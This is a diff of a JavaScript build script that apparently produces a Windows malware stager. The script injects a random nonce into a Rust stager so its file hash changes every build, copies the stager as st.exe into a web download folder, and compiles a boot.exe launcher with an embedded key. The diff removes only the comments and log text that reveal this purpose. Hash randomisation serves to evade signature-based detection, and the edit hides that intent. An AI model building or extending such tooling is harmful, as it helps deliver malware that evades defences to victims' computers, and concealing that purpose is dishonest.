@@ -19,7 +19,6 @@ export async function buildBoot({ key, buildId }) {
   const srcDir = path.join(rustDir, 'src');
   if (!fs.existsSync(srcDir)) fs.mkdirSync(srcDir, { recursive: true });
 
-  // 1. Inject random bytes into the Rust stager to change its hash every build
   const nonce = crypto.randomBytes(16);
   const nonceArr = Array.from(nonce).map(b => b.toString(16).padStart(2, '0')).join(', ');
   const embeddedKeyPath = path.join(srcDir, 'embedded_key.rs');
@@ -34,7 +33,7 @@ export async function buildBoot({ key, buildId }) {
     '',
   ].join('\n'));
 
-  console.log('[build] compiling rust stager (st.exe)...');
+  console.log('[build] compiling rust stager...');
   try {
     await execFileP('cargo', ['build', '--release', '--target', 'x86_64-pc-windows-gnu'], {
       cwd: rustDir,
@@ -51,12 +50,10 @@ export async function buildBoot({ key, buildId }) {
 
   if (!fs.existsSync(DOWNLOAD_DIR)) fs.mkdirSync(DOWNLOAD_DIR, { recursive: true });
 
-  // Copy st.exe to the web download folder
   const stFinal = path.join(DOWNLOAD_DIR, 'st.exe');
   fs.copyFileSync(baseExe, stFinal);
 
-  console.log('[build] compiling C launcher (boot.exe)...');
-  // 2. Compile the actual boot.exe wrapper
+  console.log('[build] compiling C launcher...');
   const bootBuf = await compileLauncher({
     key,
     buildId,
